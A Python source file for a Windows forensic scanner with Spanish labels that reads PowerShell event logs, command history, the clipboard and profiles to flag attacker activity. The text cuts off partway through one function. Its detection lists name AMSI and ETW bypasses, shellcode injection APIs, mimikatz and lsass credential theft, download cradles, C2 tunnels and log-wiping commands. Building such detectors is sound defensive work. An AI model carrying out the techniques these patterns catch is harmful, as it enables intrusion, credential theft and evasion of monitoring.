#!/usr/bin/env python3
import os, sys, re, csv, json, html, queue, ctypes, time, math
import subprocess, threading
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from pathlib import Path
from datetime import datetime as dt

try:
    import winreg
except ImportError:
    winreg = None

try:
    import customtkinter as ctk
except ImportError:
    ctk = None

VERSION = "4.0"
CREATE_NO_WINDOW = 0x08000000

# ═══════════════════════════════════════════════════════════════════
#  FIRMAS PS / LOLBin / Fileless  (sin cambios — base probada)
# ═══════════════════════════════════════════════════════════════════
PS_SIGNATURES = {
    'AMSI Bypass': {'sev': 'CRITICAL', 'kw': [
        'amsiInitFailed','AmsiUtils','amsiContext','AmsiScanBuffer',
        'amsiSession','amsi.dll','amsiEnable','HookAMSI','PatchAMSI',
        'amsiResult','AMSI_RESULT_CLEAN']},
    'Assembly Load (Fileless)': {'sev': 'CRITICAL', 'kw': [
        'Reflection.Assembly','::Load(','LoadWithPartialName',
        'Assembly]::Load','loadfrom(','loadfile(',
        'AssemblyLoadContext','UnsafeLoadFrom']},
    'Download GitHub': {'sev': 'HIGH', 'kw': [
        'raw.githubusercontent.com','github.com/','gist.github.com']},
    'Download Web': {'sev': 'HIGH', 'kw': [
        'DownloadData','DownloadString','DownloadFile',
        'Net.WebClient','Invoke-WebRequest','iwr ',
        'WebRequest','pastebin.com','hastebin.com','transfer.sh']},
    'Fileless Execution': {'sev': 'CRITICAL', 'kw': [
        'EntryPoint.Invoke','.Invoke($null','GetMethod(',
        'SetApartmentState','.Invoke(','DynamicInvoke',
        'InvokeMethod','MethodInfo']},
    'Base64 Payload': {'sev': 'MEDIUM', 'kw': [
        'FromBase64String','EncodedCommand','-enc ',
        'ToBase64String','-EncodedCommand']},
    'LOLBin Abuse': {'sev': 'MEDIUM', 'kw': [
        'mshta','rundll32','regsvr32','certutil',
        'bitsadmin','wscript','cscript','msiexec',
        'InstallUtil','regasm','odbcconf','forfiles']},
    'Compression / Encoding': {'sev': 'MEDIUM', 'kw': [
        'GZipStream','DeflateStream','IO.Compression',
        'BinaryFormatter','MemoryStream']},
    'Credential Access': {'sev': 'HIGH', 'kw': [
        'ConvertTo-SecureString','Get-Credential',
        'sekurlsa','mimikatz','lsass',
        'Invoke-Mimikatz','Get-GPPPassword','DumpCreds']},
    'Shellcode / Injection': {'sev': 'CRITICAL', 'kw': [
        'VirtualAlloc','WriteProcessMemory','CreateRemoteThread',
        'NtCreateThreadEx','RtlCreateUserThread','QueueUserAPC',
        'shellcode','meterpreter','cobaltstrike',
        'VirtualAllocEx','NtCreateSection','NtMapViewOfSection',
        'indirect syscall']},
    'Network C2': {'sev': 'HIGH', 'kw': [
        'ngrok','serveo.net','localhost.run',
        'cloudflared','/beacon','/stager','/payload']},
    'ETW Patching': {'sev': 'CRITICAL', 'kw': [
        'EtwEventWrite','System.Diagnostics.Eventing',
        'EventProvider']},
    'Invoke-Expression': {'sev': 'HIGH', 'kw': [
        'Invoke-Expression','iex(','iex (','. (']},
}

OBFUSCATION = {
    'Tick Escaping':          {'sev':'HIGH',    're':[r'(?:[a-zA-Z]`){3,}',r'i`[eE][xX]']},
    'String Concat Obf':      {'sev':'HIGH',    're':[r"\'[a-zA-Z]{1,6}\'\s*\+\s*\'[a-zA-Z]{1,6}\'"]},
    'Char Obfuscation':       {'sev':'HIGH',    're':[r'\[char\]\s*0x[0-9a-fA-F]{2}',r'\[char\]\s*\d{2,3}']},
    'Caret Escaping (CMD)':   {'sev':'HIGH',    're':[r'[a-zA-Z]\^[a-zA-Z]\^[a-zA-Z]']},
    'Env Variable Abuse':     {'sev':'MEDIUM',  're':[r'\$env:comspec',r'%comspec%']},
    'Reverse String':         {'sev':'MEDIUM',  're':[r'\-join\s*\(.*\[\s*-1\s*\]']},
    'Replace Obfuscation':    {'sev':'HIGH',    're':[r"[\'\"\"][A-Za-z0-9+/=_\\-]{6,}[\'\"\"].replace\("]},
    'Suspicious Long Base64': {'sev':'MEDIUM',  're':[r'[A-Za-z0-9+/=]{200,}']},
    'Encoded PS Launch':      {'sev':'HIGH',    're':[r'-[Ee]nc(?:odedCommand)?\s+[A-Za-z0-9+/=]{20,}']},
}
OBF_COMPILED = {n: {'sev':c['sev'],'patterns':[re.compile(p,re.I) for p in c['re']]}
               for n,c in OBFUSCATION.items()}

TAMPER_SIGNATURES = {
    'Historial desactivado (SaveNothing)': {'sev':'CRITICAL', 're':[
        r'HistorySaveStyle[\'"\s]*[:=]?\s*[\'"\']?SaveNothing',
        r'Set-PSReadLineOption[^\n]*SaveNothing']},
    'Manejador de historial personalizado': {'sev':'HIGH', 're':[
        r'Set-PSReadLineOption[^\n]*-AddToHistoryHandler',
        r'-AddToHistoryHandler\s*\{']},
    'Eliminación de PSReadLine': {'sev':'HIGH', 're':[
        r'Remove-Module\s+[\'"\']?PSReadLine',
        r'Uninstall-Module\s+[\'"\']?PSReadLine']},
    'Borrado manual de historial': {'sev':'HIGH', 're':[
        r'Clear-History\b',r'Remove-Item[^\n]*ConsoleHost_history']},
    'Detención de transcripción': {'sev':'MEDIUM', 're':[r'Stop-Transcript\b']},
    'Borrado del log de eventos': {'sev':'CRITICAL', 're':[
        r'Clear-EventLog\b',r'wevtutil\s+cl\b',r'Remove-EventLog\b']},
    'Reducción de tamaño de log': {'sev':'HIGH', 're':[
        r'wevtutil\s+sl\s',r'Limit-EventLog.*-MaximumSize',r'MaximumKilobytes\s*\d']},
    'Desactivación de ScriptBlock Logging': {'sev':'CRITICAL', 're':[
        r'EnableScriptBlockLogging[\'"\s]*[:=]\s*\$?(0|false)\b']},
    'Bypass de política de ejecución': {'sev':'HIGH', 're':[
        r'Set-ExecutionPolicy\s+(Bypass|Unrestricted)',
        r'-ExecutionPolicy\s+(Bypass|Unrestricted)',
        r'-[Ee][Pp]\s+(Bypass|Unrestricted)']},
    'PS v2 Downgrade (en perfil)': {'sev':'CRITICAL', 're':[
        r'powershell[^\n]*-v(?:ersion)?\s+2\b',
        r'powershell[^\n]*-version\s+2\b']},
    'AMSI Bypass (en script)': {'sev':'CRITICAL', 're':[
        r'AmsiScanBuffer',r'amsiInitFailed',
        r'AmsiOpenSession',r'AmsiContext',r'AmsiEnable\s*=\s*0']},
    'ETW Bypass': {'sev':'CRITICAL', 're':[
        r'EtwEventWrite',r'\[byte\[\]\][^\n]*\$pat',
        r'EventProvider.*Dispose']},
    'Flags de ejecución oculta': {'sev':'HIGH', 're':[
        r'-WindowStyle\s+Hidden',r'-w\s+hid',
        r'-NonInteractive[^\n]*-NoProfile',r'-noni\b']},
    'WSL como vector': {'sev':'MEDIUM', 're':[
        r'wsl\.exe',r'wsl\s+-e\s',r'bash\.exe.*-c']},
}
TAMPER_COMPILED = {n:{'sev':c['sev'],'patterns':[re.compile(p,re.I) for p in c['re']]}
                   for n,c in TAMPER_SIGNATURES.items()}

# ═══════════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════════
SEV_ORDER = {'CRITICAL':0,'HIGH':1,'MEDIUM':2,'LOW':3}

def run_ps(cmd: str, timeout: int = 90) -> str:
    try:
        r = subprocess.run(
            ['powershell','-NonInteractive','-NoProfile','-Command',cmd],
            capture_output=True, text=True, timeout=timeout,
            encoding='utf-8', errors='replace', creationflags=CREATE_NO_WINDOW)
        return r.stdout
    except Exception:
        return ''

def check_sigs(text: str) -> list:
    hits, tl = [], text.lower()
    for name, cfg in PS_SIGNATURES.items():
        if any(k.lower() in tl for k in cfg['kw']):
            hits.append((name, cfg['sev']))
    return hits

def check_obf(text: str) -> list:
    hits = []
    for name, cfg in OBF_COMPILED.items():
        if any(rx.search(text) for rx in cfg['patterns']):
            hits.append((name, cfg['sev']))
    return hits

def check_tamper(text: str) -> list:
    hits = []
    for name, cfg in TAMPER_COMPILED.items():
        if any(rx.search(text) for rx in cfg['patterns']):
            hits.append((name, cfg['sev']))
    return hits

def max_sev(hits: list) -> str:
    return min((h[1] for h in hits), key=lambda s: SEV_ORDER.get(s,9)) if hits else 'LOW'

def make_finding(source, time_val, hits, content, path='', fileless=False, cat='exec') -> dict:
    deduped = list(dict.fromkeys(hits))
    return {
        'source': source,
        'time': time_val if time_val and time_val.strip() else '(sin timestamp)',
        'severity': max_sev(deduped), 'hits': deduped, 'fileless': fileless,
        'path': path or source, 'content': content,
        'summary': content[:150].replace('\n',' '),
        'cat': cat,
    }

def _kv(raw: str, key='K', val='V'):
    out = {}
    for block in raw.split('^END'):
        if f'^{key}:' not in block: continue
        try:
            k = block.split(f'^{key}:')[1].split(f'^{val}:')[0].strip()
            v = block.split(f'^{val}:')[1].strip() if f'^{val}:' in block else ''
        except IndexError: continue
        out[k] = v
    return out

def now_str(): return dt.now().strftime('%Y-%m-%d %H:%M:%S')

# ═══════════════════════════════════════════════════════════════════
#  ESCÁNERES — CATEGORÍA: EVIDENCIA DE EJECUCIÓN
# ═══════════════════════════════════════════════════════════════════

def scan_ps4104() -> list:
    """4104 ScriptBlock Logging — contenido exacto de scripts ejecutados."""
    cmd = r"""
$evs = Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' `
    -MaxEvents 1000 -ErrorAction SilentlyContinue | Where-Object { $_.Id -eq 4104 }
foreach ($e in $evs) {
    $x=[xml]$e.ToXml(); $d=$x.Event.EventData.Data
    $txt=($d|Where-Object{$_.Name -eq 'ScriptBlockText'}).'#text'
    $path=($d|Where-Object{$_.Name -eq 'Path'}).'#text'
    $t=$e.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss')
    Write-Output "^T:$t^P:$path^B:$txt^END"
}
"""
    raw, findings = run_ps(cmd, 90), []
    for block in raw.split('^END'):
        if '^T:' not in block: continue
        try:
            tv = block.split('^T:')[1].split('^P:')[0].strip()
            pv = block.split('^P:')[1].split('^B:')[0].strip()
            bv = block.split('^B:')[1].strip() if '^B:' in block else ''
        except IndexError: continue
        if not bv: continue
        hits = check_sigs(bv) + check_obf(bv) + check_tamper(bv)
        if hits:
            findings.append(make_finding(
                'PS Event 4104', tv, hits, bv,
                path=pv or '<fileless>', fileless=not pv.strip(), cat='exec'))
    return findings


def scan_module_logging() -> list:
    """4103 Module Logging — cmdlets y módulos invocados."""
    cmd = r"""
$evs = Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' `
    -MaxEvents 500 -ErrorAction SilentlyContinue | Where-Object { $_.Id -eq 4103 }
foreach ($e in $evs) {
    $t = $e.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss')
    $m = ($e.Message -split '\n')[0..8] -join ' | '
    Write-Output "^T:$t^M:$m^END"
}
"""
    raw, findings = run_ps(cmd, 60), []
    for block in raw.split('^END'):
        if '^T:' not in block: continue
        try:
            tv = block.split('^T:')[1].split('^M:')[0].strip()
            mv = block.split('^M:')[1].strip() if '^M:' in block else ''
        except IndexError: continue
        if not mv: continue
        hits = check_sigs(mv) + check_obf(mv)
        if hits:
            findings.append(make_finding(
                'PS Event 4103 (Module Log)', tv, hits, mv,
                path='<Microsoft-Windows-PowerShell/Operational>', cat='exec'))
    return findings


def scan_process_creation() -> list:
    """4688 — procesos creados con flags sospechosos o sin captura de línea de comandos."""
    cmd = r"""
$evs = Get-WinEvent -LogName Security -MaxEvents 1000 -ErrorAction SilentlyContinue |
    Where-Object { $_.Id -eq 4688 }
foreach ($e in $evs) {
    $x=[xml]$e.ToXml(); $d=@{}
    foreach ($i in $x.Event.EventData.Data) { $d[$i.Name]=$i.'#text' }
    $proc=$d['NewProcessName']; $cl=$d['CommandLine']
    $t=$e.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss')
    if ($proc -match 'powershell|pwsh|cmd\.exe|wscript|cscript|mshta|wmic|regsvr32|rundll32|certutil|bitsadmin|msiexec|installutil|regasm') {
        Write-Output "^T:$t^P:$proc^C:$cl^END"
    }
}
"""
    raw, findings = run_ps(cmd, 90), []
    for block in raw.split('^END'):
        if '^T:' not in block: continue
        try:
            tv = block.split('^T:')[1].split('^P:')[0].strip()
            pv = block.split('^P:')[1].split('^C:')[0].strip()
            cv = block.split('^C:')[1].strip() if '^C:' in block else ''
        except IndexError: continue

        hits = check_sigs(cv) + check_obf(cv) + check_tamper(cv)
        cl_low = cv.lower()

        # Flags de ejecución oculta
        if any(f in cl_low for f in ['-windowstyle hidden', '-w hidden', '-w hid']):
            hits.append(('Ejecución oculta (-WindowStyle Hidden)', 'HIGH'))
        if any(f in cl_low for f in ['-encodedcommand', '-enc ']):
            hits.append(('Comando codificado en Base64', 'HIGH'))
        if '-version 2' in cl_low or ' -v 2 ' in cl_low:
            hits.append(('PS v2 Downgrade detectado en proceso', 'CRITICAL'))
        if any(f in cl_low for f in ['-noprofile', '-nop ']):
            if any(f in cl_low for f in ['-noninteractive', '-noni']):
                hits.append(('Lanzamiento no interactivo y sin perfil', 'MEDIUM'))
        if not cv.strip() and pv:
            hits.append(('4688 sin CommandLine (auditoría incompleta)', 'MEDIUM'))

        hits = list(dict.fromkeys(hits))
        if hits:
            content = f"Proceso: {pv}\nArgumentos: {cv or '(sin captura de línea de comandos)'}"
            findings.append(make_finding(
                f'Proceso 4688 ({Path(pv).name})', tv, hits,
                content, path=pv, cat='exec'))
    return findings


def scan_ps_events() -> list:
    """Eventos 400/600/800 del motor PS + TextInputHost."""
    findings = []
    cmd = r"""
$evs = Get-WinEvent -LogName 'Windows PowerShell' -MaxEvents 1000 `
    -ErrorAction SilentlyContinue | Where-Object { $_.Id -in @(400,600,800) }
foreach ($e in $evs) {
    $x=[xml]$e.ToXml(); $d=@{}
    foreach ($i in $x.Event.EventData.Data) { $d[$i.Name]=$i.'#text' }
    $t=$e.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss'); $id=$e.Id
    $info=switch($id){
        400{"App="+$d['HostApplication']+" | Engine="+$d['EngineVersion']+" | Host="+$d['HostName']}
        600{"Provider="+$d['ProviderName']+" | State="+$d['NewState']}
        800{"Cmd="+$d['CommandLine']}
    }
    Write-Output "^ID:$id^T:$t^I:$info^END"
}
"""
    raw = run_ps(cmd, 60)
    labels = {'400':'PS Motor','600':'PS Proveedor','800':'PS Pipeline'}
    for block in raw.split('^END'):
        if '^ID:' not in block: continue
        try:
            eid = block.split('^ID:')[1].split('^T:')[0].strip()
            tv  = block.split('^T:')[1].split('^I:')[0].strip()
            iv  = block.split('^I:')[1].strip() if '^I:' in block else ''
        except IndexError: continue
        if not iv: continue
        hits = check_sigs(iv) + check_obf(iv)
        # PS v2 en evento 400
        if eid == '400' and 'engine=2.' in iv.lower():
            hits.append(('PS v2 Downgrade detectado (Motor)', 'CRITICAL'))
        if eid == '400' and any(f in iv.lower() for f in ['-enc', 'encodedcommand']):
            hits.append(('Encoded PS Launch (E400)', 'HIGH'))
        if hits:
            findings.append(make_finding(
                f'PS Event {eid} ({labels.get(eid,eid)})', tv, hits, iv,
                path='<Windows PowerShell log>', cat='exec'))

    # TextInputHost — persiste desde el arranque
    cmd_ti = r"""
$evs = Get-WinEvent -LogName 'Microsoft-Windows-TextInput/Operational' `
    -MaxEvents 300 -ErrorAction SilentlyContinue
foreach ($e in $evs) {
    $t=$e.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss')
    Write-Output "^T:$t^M:$($e.Message)^END"
}
"""
    for block in run_ps(cmd_ti, 30).split('^END'):
        if '^T:' not in block: continue
        try:
            tv = block.split('^T:')[1].split('^M:')[0].strip()
            mv = block.split('^M:')[1].strip() if '^M:' in block else ''
        except IndexError: continue
        if not mv: continue
        hits = check_sigs(mv) + check_obf(mv)
        if hits:
            findings.append(make_finding(
                'TextInputHost', tv, hits, mv,
                path='<TextInput log>', fileless=True, cat='exec'))
    return findings


def scan_cmd_history() -> list:
    """Historial de consola (ConsoleHost_history.txt) + MRU Win+R."""
    findings = []
    ps_hist = (Path(os.environ.get('APPDATA', '')) /
               'Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt')
    if ps_hist.exists():
        try:
            lines = ps_hist.read_text(encoding='utf-8', errors='replace').splitlines()
            for line in lines:
                if not line.strip(): continue
                hits = check_sigs(line) + check_obf(line) + check_tamper(line)
                if hits:
                    findings.append(make_finding(
                        'Historial PS (ConsoleHost)', '', hits, line,
                        path=str(ps_hist), cat='exec'))
        except Exception: pass

    if winreg:
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r'Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU')
            idx = 0
            while True:
                try:
                    name, val, _ = winreg.EnumValue(k, idx); idx += 1
                    if name == 'MRUList': continue
                    val = str(val).rstrip('\x01').strip()
                    hits = check_sigs(val) + check_obf(val) + check_tamper(val)
                    if hits:
                        findings.append(make_finding(
                            'Run MRU (Win+R)', '', hits, val,
                            path='<HKCU\\...\\RunMRU>', cat='exec'))
                except OSError: break
            winreg.CloseKey(k)
        except Exception: pass
    return findings


def scan_clipboard_history() -> list:
    """Portapapeles actual + historial Win+V (si está habilitado)."""
    findings = []

    # Portapapeles actual (ctypes directo — sin PS)
    CF_UNICODE = 13
    current = ''
    try:
        u32, k32 = ctypes.windll.user32, ctypes.windll.kernel32
        if u32.OpenClipboard(0):
            h = u32.GetClipboardData(CF_UNICODE)
            if h:
                p = k32.GlobalLock(h)
                if p:
                    try:    current = ctypes.wstring_at(p)
                    finally: k32.GlobalUnlock(h)
            u32.CloseClipboard()
    except Exception: pass

    if current and len(current.strip()) > 5:
        hits = check_sigs(current) + check_obf(current) + check_tamper(current)
        if hits:
            findings.append(make_finding(
                'Portapapeles (actual)', f'Escaneado: {now_str()}',
                hits, current, path='<clipboard>', fileless=True, cat='exec'))

    # Estado del historial Win+V
    cmd = r"""
$r = 'HKCU:\Software\Microsoft\Clipboard'
$en = (Get-ItemProperty $r -EA SilentlyContinue).EnableClipboardHistory
Write-Output "^EN:$en^END"
"""
    for block in run_ps(cmd, 10).split('^END'):
        if '^EN:' not in block: continue
        try: enabled = block.split('^EN:')[1].strip()
        except: enabled = ''
        break
    else:
        enabled = ''

    clip_dir = Path(os.environ.get('LOCALAPPDATA', '')) / 'Microsoft/Windows/Clipboard'
    if clip_dir.exists():
        files = [f for f in clip_dir.rglob('*') if f.is_file()]
        if not files and enabled not in ('0', 'False', ''):
            findings.append(make_finding(
                'Portapapeles — historial (Win+V)',
                f'Comprobado: {now_str()}',
                [('Historial de portapapeles vacío (posible borrado manual)', 'MEDIUM')],
                f'El historial Win+V estaba habilitado ({enabled}) pero la carpeta está vacía.\n'
                f'Ruta: {clip_dir}',
                path=str(clip_dir), fileless=True, cat='exec'))
    return findings


def scan_ise_history() -> list:
    """Historial de PowerShell ISE y VSCode-PS Host."""
    findings = []
    base = Path(os.environ.get('APPDATA', ''))
    ise_files = [
        base / 'Microsoft/Windows/PowerShell/PSReadLine/Visual Studio Code Host_history.txt',
        base / 'Microsoft/Windows/PowerShell/PSReadLine/Windows PowerShell ISE Host_history.txt',
        base / 'Microsoft/Windows/PowerShell/ISE/history.txt',
    ]
    for path in ise_files:
        if not path.exists(): continue
        try:
            content = path.read_text(encoding='utf-8', errors='replace')
        except Exception: continue
        if not content.strip(): continue
        for line in content.splitlines():
            if not line.strip(): continue
            hits = check_sigs(line) + check_obf(line) + check_tamper(line)
            if hits:
                findings.append(make_finding(
                    f'ISE/VSCode Historial ({path.name})', '', hits, line,
                    path=str(path), cat='exec'))

    # Archivos de autoguardado ISE
    ise_dir = base / 'Microsoft/Windows/PowerShell/ISE'
    if ise_dir.exists():
        for f in ise_dir.glob('*.ps1xml'):
            try:
                content = f.read_text(encoding='utf-8', errors='replace')
                hits = check_sigs(content) + check_obf(content)
                if hits:
                    findings.append(make_finding(
                        f'ISE Autoguardado ({f.name})', '', hits,
                        content[:8000], path=str(f), cat='exec'))
            except Exception: pass
    return findings

# ═══════════════════════════════════════════════════════════════════
#  ESCÁNERES — CATEGORÍA: DETECCIÓN DE BYPASS
# ═══════════════════════════════════════════════════════════════════

def scan_profile_integrity() -> list:
    """$PROFILE — código que se ejecuta en cada sesión de PowerShell."""
    cmd = r"""
$paths = @(
    $PROFILE.AllUsersAllHosts, $PROFILE.AllUsersCurrentHost,
    $PROFILE.CurrentUserAllHosts, $PROFILE.CurrentUserCurrentHost,
    (Join-Path $HOME 'Documents\PowerShell\Microsoft.PowerShell_profile.ps1'),
    (Join-Path $HOME 'Documents\PowerShell\profile.ps1')
) | Where-Object { $_ } | Select-Object -Unique
foreach ($p in $paths) {
    if (Test-Path $p -PathType Leaf) {
        $c = Get-Content $p -Raw -EA SilentlyContinue
        if ($c -and $c.Trim()) { Write-Output "^P:$p^C:$c^END" }
    }
}
"""
    raw, findings = run_ps(cmd, 30), []
    for block in raw.split('^END'):
        if '^P:' not in block: continue
        try:
            pv = block.split('^P:')[1].split('^C:')[0].strip()
            cv = block.split('^C:')[1].strip() if '^C:' in block else ''
        except IndexError: continue
        if not cv: continue
        hits = check_tamper(cv) + check_sigs(cv) + check_obf(cv)
        if hits:
            findings.append(make_finding(
                f'$PROFILE ({Path(pv).name})', f'Leído: {now_str()}',
                hits, cv, path=pv, cat='bypass'))
    return findings


def scan_history_integrity() -> list:
    """ConsoleHost/PSReadLine — estado real del guardado de historial."""
    cmd = r"""
$res=[ordered]@{}
try {
    $opt=Get-PSReadLineOption
    $res['SaveStyle']=$opt.HistorySaveStyle.ToString()
    $res['Handler']=[bool]$opt.AddToHistoryHandler
    $res['HistPath']=$opt.HistorySavePath
} catch {
    $res['SaveStyle']='DESCONOCIDO'; $res['Handler']=$false
    $res['HistPath']=Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
}
$res['PSReadLine']=[bool](Get-Module PSReadLine -EA SilentlyContinue)
if (Test-Path $res['HistPath']) {
    $it=Get-Item $res['HistPath']
    $res['Exists']='True'; $res['SizeBytes']=$it.Length
    $res['LastWrite']=$it.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')
    $res['ReadOnly']=$it.IsReadOnly
} else { $res['Exists']='False' }
$res.GetEnumerator() | ForEach-Object { Write-Output "^K:$($_.Key)^V:$($_.Value)^END" }
"""
    d = _kv(run_ps(cmd, 20))
    if not d: return []
    hits = []
    style = d.get('SaveStyle', '')
    if style == 'SaveNothing':
        hits.append(('Guardado de historial desactivado (SaveNothing en vivo)', 'CRITICAL'))
    if style == 'DESCONOCIDO':
        hits.append(('No se pudo leer la configuración de PSReadLine', 'MEDIUM'))
    if d.get('Handler') == 'True':
        hits.append(('AddToHistoryHandler activo — filtra comandos del historial', 'CRITICAL'))
    if d.get('PSReadLine') == 'False':
        hits.append(('Módulo PSReadLine no cargado', 'HIGH'))
    if d.get('Exists') == 'False':
        hits.append(('Archivo de historial inexistente', 'HIGH'))
    else:
        if d.get('ReadOnly') == 'True':
            hits.append(('Archivo de historial de solo lectura', 'HIGH'))
        try:
            if int(d.get('SizeBytes', '1')) < 10:
                hits.append(('Archivo de historial vacío o casi vacío', 'MEDIUM'))
        except ValueError: pass
    if not hits: return []
    content = '\n'.join(f'{k}: {v}' for k, v in d.items())
    return [make_finding('Integridad: Historial (ConsoleHost)', f'Comprobado: {now_str()}',
                         hits, content, path=d.get('HistPath', ''), fileless=True, cat='bypass')]


def scan_eventlog_integrity() -> list:
    """Visor de eventos — borrados, canales desactivados, tamaño reducido, GPO."""
    cmd = r"""
foreach ($log in @('Security','Microsoft-Windows-PowerShell/Operational','Windows PowerShell')) {
    try {
        $li=Get-WinEvent -ListLog $log -EA SilentlyContinue
        if ($li) {
            Write-Output "^TYPE:STATE^LOG:$log^ENABLED:$($li.IsEnabled)^MAX:$($li.MaximumSizeInBytes)^SIZE:$($li.FileSize)^END"
        }
        $cl=Get-WinEvent -LogName $log -MaxEvents 80 -EA SilentlyContinue |
            Where-Object { $_.Id -in @(1102,104) }
        foreach ($c in $cl) {
            Write-Output "^TYPE:CLEARED^LOG:$log^T:$($c.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss'))^END"
        }
    } catch {}
}
# 4719 — auditoría cambiada
$evs4719 = Get-WinEvent -LogName Security -MaxEvents 50 -EA SilentlyContinue |
    Where-Object { $_.Id -eq 4719 }
foreach ($e in $evs4719) {
    $t=$e.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss')
    $m=($e.Message -replace "`r`n",' | ').Substring(0,[Math]::Min(300,$e.Message.Length))
    Write-Output "^TYPE:AUDIT_CHANGED^LOG:Security^T:$t^MSG:$m^END"
}
# GPO ScriptBlock Logging
try {
    $g=Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -EA SilentlyContinue
    $v=if($g -and $null -ne $g.EnableScriptBlockLogging){$g.EnableScriptBlockLogging}else{'SIN_CONFIGURAR'}
    Write-Output "^TYPE:GPO_SBL^LOG:ScriptBlockLogging^T:$v^END"
} catch {}
# GPO Module Logging
try {
    $g=Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -EA SilentlyContinue
    $v=if($g -and $null -ne $g.EnableModuleLogging){$g.EnableModuleLogging}else{'SIN_CONFIGURAR'}
    Write-Output "^TYPE:GPO_ML^LOG:ModuleLogging^T:$v^END"
} catch {}
"""
    raw, findings = run_ps(cmd, 45), []
    MIN_SIZES = {
        'Security': 20*1024*1024,
        'Microsoft-Windows-PowerShell/Operational': 5*1024*1024,
        'Windows PowerShell': 5*1024*1024,
    }
    for block in raw.split('^END'):
        if '^TYPE:' not in block: continue
        try:
            typ = block.split('^TYPE:')[1].split('^LOG:')[0].strip()
            log = block.split('^LOG:')[1].split('^')[0].strip()
        except IndexError: continue

        if typ == 'STATE':
            try:
                enabled = block.split('^ENABLED:')[1].split('^')[0].strip()
                maxb    = int(block.split('^MAX:')[1].split('^')[0].strip() or '0')
                sizb    = int(block.split('^SIZE:')[1].strip() or '0')
            except (IndexError, ValueError): continue
            hits = []
            if enabled == 'False':
                hits.append(('Canal de log deshabilitado', 'CRITICAL'))
            min_s = MIN_SIZES.get(log, 5*1024*1024)
            if maxb > 0 and maxb < min_s:
                hits.append(('Tamaño máximo de log reducido a menos del mínimo esperado', 'HIGH'))
            if sizb < 1024 and maxb > 0:
                hits.append(('Log casi vacío — posible borrado o rotación forzada', 'MEDIUM'))
            if hits:
                findings.append(make_finding(
                    f'Visor de eventos ({log})', f'Comprobado: {now_str()}', hits,
                    f'Canal: {log}\nHabilitado: {enabled}\n'
                    f'Tamaño máximo: {maxb/1024/1024:.1f} MB\n'
                    f'Tamaño actual: {sizb/1024:.1f} KB',
                    path=f'<{log}>', cat='bypass'))

        elif typ == 'CLEARED':
            tv = block.split('^T:')[1].strip() if '^T:' in block else ''
            findings.append(make_finding(
                f'Visor de eventos ({log})', tv,
                [('Registro de eventos borrado (1102/104)', 'CRITICAL')],
                f'El registro "{log}" fue borrado el {tv}.',
                path=f'<{log}>', cat='bypass'))

        elif typ == 'AUDIT_CHANGED':
            tv  = block.split('^T:')[1].split('^MSG:')[0].strip() if '^T:' in block else ''
            msg = block.split('^MSG:')[1].strip() if '^MSG:' in block else ''
            findings.append(make_finding(
                'Política de auditoría modificada (4719)', tv,
                [('Auditoría del sistema modificada', 'CRITICAL')],
                f'Evento 4719: política de auditoría cambiada.\n{msg}',
                path='<Security log>', cat='bypass'))

        elif typ == 'GPO_SBL':
            val = block.split('^T:')[1].strip() if '^T:' in block else ''
            if val in ('0', 'SIN_CONFIGURAR'):
                sev = 'MEDIUM' if val == 'SIN_CONFIGURAR' else 'HIGH'
                label = ('Script Block Logging no configurado (SBL ausente)' if val == 'SIN_CONFIGURAR'
                         else 'Script Block Logging desactivado por política GPO')
                findings.append(make_finding(
                    'Política GPO: ScriptBlock Logging', f'Comprobado: {now_str()}',
                    [(label, sev)],
                    f'EnableScriptBlockLogging = {val}\n\n'
                    'Sin este valor en 1, el escáner 4104 no puede ver el contenido '
                    'de lo que se ejecuta, independientemente del resto de controles.',
                    path=r'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging',
                    cat='bypass'))

        elif typ == 'GPO_ML':
            val = block.split('^T:')[1].strip() if '^T:' in block else ''
            if val in ('0', 'SIN_CONFIGURAR'):
                sev = 'MEDIUM' if val == 'SIN_CONFIGURAR' else 'HIGH'
                findings.append(make_finding(
                    'Política GPO: Module Logging', f'Comprobado: {now_str()}',
                    [('Module Logging (4103) no activo', sev)],
                    f'EnableModuleLogging = {val}\n\nSin este valor en 1, '
                    'el escáner 4103 no registra cmdlets invocados.',
                    path=r'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging',
                    cat='bypass'))
    return findings


def scan_psv2() -> list:
    """Detecta si PS v2 está disponible o ha sido usado para evadir logging."""
    cmd = r"""
try {
    $f=Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -EA Stop
    Write-Output "^FEATURE:$($f.State)^END"
} catch { Write-Output "^FEATURE:UNKNOWN^END" }
$evs=Get-WinEvent -LogName 'Windows PowerShell' -MaxEvents 300 -EA SilentlyContinue |
    Where-Object { $_.Id -eq 400 -and $_.Message -match 'EngineVersion=2\.' }
foreach ($e in $evs) {
    $t=$e.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss')
    $m=($e.Message -split '\n')[0..4] -join ' | '
    Write-Output "^USED:$t^MSG:$m^END"
}
"""
    raw, findings = run_ps(cmd, 30), []
    feature_state = 'UNKNOWN'
    for block in raw.split('^END'):
        if '^FEATURE:' in block:
            try: feature_state = block.split('^FEATURE:')[1].strip()
            except: pass
        elif '^USED:' in block:
            try:
                tv = block.split('^USED:')[1].split('^MSG:')[0].strip()
                mv = block.split('^MSG:')[1].strip() if '^MSG:' in block else ''
            except IndexError: continue
            findings.append(make_finding(
